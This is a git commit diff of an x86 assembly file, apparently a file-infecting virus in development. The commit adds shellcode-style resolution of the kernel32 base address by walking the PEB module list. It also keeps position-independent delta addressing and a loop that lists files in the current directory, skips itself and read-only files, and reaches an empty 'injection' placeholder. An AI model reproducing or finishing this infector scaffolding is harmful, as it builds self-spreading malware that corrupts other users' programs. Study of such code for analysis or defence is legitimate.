327a5be1b01326b438e9a86e9bb5d7115ab124b6
Alexandre Paillier <alexandre.paillier@epitech.eu>
2017-02-27 15:13:32 +0100

    Now resolves kernel32 base address

--- yharnam.asm
+++ yharnam.asm
@@ -2,7 +2,7 @@
 ;
 ; Made by:
 ;
-; 	- alexandre.paillier@epitech.eu
+; 	- 0xfee15bad (Alexandre Paillier)
 ;
 	
 .386
@@ -37,7 +37,65 @@ _getAddr_:
 	; ebx holds "data section" address
 	; (call instruction + (start label address - data label instruction))
 	sub ebx, (5 + (start - data))
+	push ebx ; save it back temporarily
 
+	; resolve kernel32 base address
+	ASSUME FS:NOTHING
+	mov edx, fs:[030h] ; get the PEB struct
+	ASSUME FS:ERROR
+	; ->Ldr / get the PEB_LDR_DATA struct
+	mov edx, [edx + (sizeof BYTE*2 + \   ; Reserved1
+					 sizeof BYTE + \     ; BeingDebugged
+					 sizeof BYTE*1 + \   ; Reserved2
+					 sizeof PVOID*2)]    ; Reserved3
+	; ->InMemoryOrderModuleList / gets the loaded modules linked list
+	mov edx, [edx + (sizeof BYTE*8 + \   ; Reserved1
+					 sizeof PVOID*3)]    ; Reserved2
+
+	; loop through the linked list until we match with "KERNEL32.DLL"
+	; partial check : length=12; name[0]=K; name[5]=L; name[7]=2
+	; should be enough
+loop_find_kernel32:
+	; ->FullDllName / get the UNICODE_STRING struct
+	mov eax, edx
+	add eax, (sizeof PVOID*2 + \  ; Reserved1
+			  sizeof PVOID*2 + \  ; InMemoryOrderLinks
+			  sizeof PVOID*2 + \  ; Reserved2
+			  sizeof PVOID + \    ; DllBase
+			  sizeof PVOID + \    ; EntryPoint
+			  sizeof PVOID)       ; Reserved3
+	; ->Length
+	mov bx, [eax]
+	; check the length
+	cmp bx, (12 * sizeof WCHAR)
+	jne loop_find_kernel32_continue
+
+	; ->Buffer
+	mov eax, [eax + (sizeof USHORT + \ ; Length
+	                 sizeof USHORT)]   ; MaximumLength
+	; check the string
+	mov bx, [eax]
+	cmp bx, 'K'
+	jne loop_find_kernel32_continue
+	mov bx, [eax + 5 * sizeof WCHAR]
+	cmp bx, 'L'
+	jne loop_find_kernel32_continue
+	mov bx, [eax + 7 * sizeof WCHAR]
+	cmp bx, '2'
+	jne loop_find_kernel32_continue
+	jmp loop_find_kernel32_end
+loop_find_kernel32_continue:
+	; (LIST_ENTRY)->Flink / get next loaded module
+	mov edx, [edx]
+	jmp loop_find_kernel32
+loop_find_kernel32_end:
+	; get kernel32 base address
+	mov edx, [edx + (sizeof PVOID*2 + \ ; Reserved1
+	                 sizeof PVOID*2 + \ ; InMemoryOrderLinks
+					 sizeof PVOID*2)]   ; Reserved2
+	
+	pop ebx
+	; allocate space on the stack
 	sub esp, [ebx + (stackSize - data)]
 
 	mov edx, esp
@@ -80,7 +138,7 @@ loop_find_file:
 	mov edx, [edx + (fileStruct.WIN32_FIND_DATA.dwFileAttributes - fileStruct.WIN32_FIND_DATA)]
 	and edx, FILE_ATTRIBUTE_DIRECTORY
 	cmp edx, FILE_ATTRIBUTE_DIRECTORY
-	je loop_find_file_skip
+	je loop_find_file_continue
 
 	mov eax, esp
 	mov edx, eax
@@ -91,19 +149,19 @@ loop_find_file:
 	push edx
 	call lstrcmp ; check if this is the program
 	cmp eax, 0
-	je loop_find_file_skip
+	je loop_find_file_continue
 
 	mov edx, esp ; check if it's a read-only file
 	add edx, [ebx + (fileStruct - data)]
 	mov edx, [edx + (fileStruct.WIN32_FIND_DATA.dwFileAttributes - fileStruct.WIN32_FIND_DATA)]
 	and edx, FILE_ATTRIBUTE_READONLY
 	cmp edx, FILE_ATTRIBUTE_READONLY
-	je loop_find_file_skip
+	je loop_find_file_continue
 
 ;	injection
 ;
 
-loop_find_file_skip:
+loop_find_file_continue:
 	mov eax, esp
 	mov edx, eax
 	add edx, [ebx + (fileStruct - data)]
